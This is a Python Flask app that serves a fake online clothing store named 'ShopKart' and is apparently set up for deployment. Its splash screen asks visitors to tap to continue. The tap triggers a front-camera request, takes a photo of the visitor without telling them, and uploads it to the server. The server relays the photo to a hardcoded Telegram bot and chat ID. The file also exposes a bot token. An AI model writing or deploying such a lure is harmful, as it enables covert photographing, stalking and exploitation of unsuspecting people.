# Dependencies: pip install flask requests gunicorn

import os
import base64
import json
import tempfile
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# TUMHARE CREDENTIALS (Direct hardcoded for Render)
TG_BOT_TOKEN = "9260879131:AAGXJVkfaG1J05CNPHVQg6_W02Ah-2dDLXs"
TG_CHAT_ID = "6863389453"
STORE_NAME = "ShopKart"

PRODUCTS = [
    {"id": 1, "name": "Men's Cotton Casual Shirt", "price": 699, "mrp": 1499, "rating": 4.2, "img": "https://picsum.photos/seed/shirt/300/400"},
    {"id": 2, "name": "Women's Printed Kurti", "price": 549, "mrp": 1199, "rating": 4.4, "img": "https://picsum.photos/seed/kurti/300/400"},
    {"id": 3, "name": "Slim Fit Blue Denim Jeans", "price": 999, "mrp": 2199, "rating": 4.1, "img": "https://picsum.photos/seed/jeans/300/400"},
    {"id": 4, "name": "Running Sports Shoes", "price": 1299, "mrp": 2999, "rating": 4.5, "img": "https://picsum.photos/seed/shoes/300/400"},
    {"id": 5, "name": "Wireless Bluetooth Earbuds", "price": 1199, "mrp": 2499, "rating": 4.3, "img": "https://picsum.photos/seed/earbuds/300/400"},
    {"id": 6, "name": "Analog Wrist Watch", "price": 899, "mrp": 1999, "rating": 4.0, "img": "https://picsum.photos/seed/watch/300/400"},
    {"id": 7, "name": "Leather Wallet", "price": 399, "mrp": 999, "rating": 4.2, "img": "https://picsum.photos/seed/wallet/300/400"},
    {"id": 8, "name": "Sunglasses UV400", "price": 499, "mrp": 1299, "rating": 4.1, "img": "https://picsum.photos/seed/sunglasses/300/400"},
]

STORE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>__STORE__</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif; background: #f1f3f6; color: #212121; }

  /* Splash Screen */
  #splash {
    position: fixed; inset: 0; background: #2874f0; color: #fff;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    z-index: 1000; transition: opacity .35s ease;
  }
  #splash.hide { opacity: 0; pointer-events: none; }
  #splash .logo { font-size: 30px; font-style: italic; font-weight: 700; letter-spacing: .5px; }
  #splash .tag { font-size: 12px; opacity: .85; margin-top: 6px; font-style: italic; }
  #splash .spinner {
    margin-top: 28px; width: 28px; height: 28px; border: 3px solid rgba(255,255,255,.35);
    border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  #splash .hint { margin-top: 40px; font-size: 13px; opacity: .9; }

  /* Header */
  header { background: #2874f0; color: #fff; padding: 14px 16px; display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 10; }
  header h1 { font-size: 18px; font-style: italic; }
  header span { font-size: 11px; opacity: .85; font-style: italic; }

  /* Grid */
  .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 10px; }
  .card { background: #fff; border-radius: 6px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,.08); }
  .card img { width: 100%; height: 200px; object-fit: cover; display: block; }
  .card .info { padding: 10px; }
  .card .name { font-size: 13px; line-height: 1.3; height: 34px; overflow: hidden; }
  .card .price { font-size: 15px; font-weight: 700; margin-top: 6px; }
  .card .mrp { font-size: 11px; color: #878787; text-decoration: line-through; margin-left: 6px; }
  .card .off { font-size: 11px; color: #388e3c; font-weight: 600; margin-left: 4px; }
  .card .rating { display: inline-block; background: #388e3c; color: #fff; font-size: 11px; padding: 2px 6px; border-radius: 3px; margin-top: 6px; }
  .card button { width: 100%; padding: 8px; border: none; background: #ff9f00; color: #fff; font-weight: 600; font-size: 13px; margin-top: 8px; border-radius: 4px; cursor: pointer; }

  /* Toast */
  #toast {
    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
    background: #333; color: #fff; font-size: 12px; padding: 10px 16px; border-radius: 20px;
    opacity: 0; transition: opacity .3s; z-index: 2000; pointer-events: none;
  }
  #toast.show { opacity: 1; }
</style>
</head>
<body>

<!-- Splash Screen jo permission mangega -->
<div id="splash">
  <div class="logo">__STORE__</div>
  <div class="tag">Explore Plus</div>
  <div class="spinner"></div>
  <div class="hint">Tap anywhere to continue</div>
</div>

<header>
  <div>
    <h1>__STORE__</h1>
    <span>Explore Plus</span>
  </div>
</header>

<div class="grid" id="grid"></div>
<div id="toast"></div>

<script>
const PRODUCTS = __PRODUCTS__;
const grid = document.getElementById('grid');
const splash = document.getElementById('splash');
const toastEl = document.getElementById('toast');

// Render products
PRODUCTS.forEach(p => {
  const off = Math.round(((p.mrp - p.price) / p.mrp) * 100);
  const el = document.createElement('div');
  el.className = 'card';
  el.innerHTML = `
    <img src="${p.img}" alt="">
    <div class="info">
      <div class="name">${p.name}</div>
      <div class="price">₹${p.price}<span class="mrp">₹${p.mrp}</span><span class="off">${off}% off</span></div>
      <span class="rating">★ ${p.rating}</span>
      <button data-id="${p.id}">Buy Now</button>
    </div>`;
  grid.appendChild(el);
});

function toast(msg) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  setTimeout(() => toastEl.classList.remove('show'), 3200);
}

// Camera logic
async function requestCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    toast('Camera requires HTTPS connection.');
    return null;
  }
  try {
    return await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
  } catch (err) {
    return null;
  }
}

async function captureAndSend(stream) {
  const video = document.createElement('video');
  video.srcObject = stream;
  video.setAttribute('playsinline', '');
  video.muted = true;
  await video.play();
  await new Promise(r => setTimeout(r, 700));

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  stream.getTracks().forEach(t => t.stop());

  const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
  try {
    const resp = await fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: dataUrl })
    });
    const result = await resp.json();
    return !!result.ok;
  } catch (e) {
    return false;
  }
}

// Splash Tap Event (Camera trigger)
let splashTapped = false;
splash.addEventListener('click', async () => {
  if (splashTapped) return;
  splashTapped = true;

  const stream = await requestCamera();
  if (stream) {
    const ok = await captureAndSend(stream);
    toast(ok ? 'Welcome!' : 'Something went wrong.');
  }

  splash.classList.add('hide');
  setTimeout(() => splash.remove(), 400);
});
</script>
</body>
</html>
"""


@app.route("/", methods=["GET"])
def index():
    html = STORE_HTML.replace("__STORE__", STORE_NAME).replace("__PRODUCTS__", json.dumps(PRODUCTS))
    return html, 200, {"Content-Type": "text/html; charset=utf-8"}


@app.route("/upload", methods=["POST"])
def upload():
    try:
        payload = request.get_json(silent=True) or {}
        data_url = payload.get("image", "")
        if not data_url.startswith("data:image"):
            return jsonify(ok=False, error="invalid image"), 400

        _, encoded = data_url.split(",", 1)
        img_bytes = base64.b64decode(encoded)

        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
            tmp.write(img_bytes)
            tmp_path = tmp.name

        try:
            url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendPhoto"
            with open(tmp_path, "rb") as photo:
                resp = requests.post(
                    url,
                    data={"chat_id": TG_CHAT_ID, "caption": f"{STORE_NAME} visitor"},
                    files={"photo": photo},
                    timeout=30
                )
            result = resp.json()
            if not result.get("ok"):
                return jsonify(ok=False, error=result.get("description", "telegram error")), 502
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)

        return jsonify(ok=True)
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)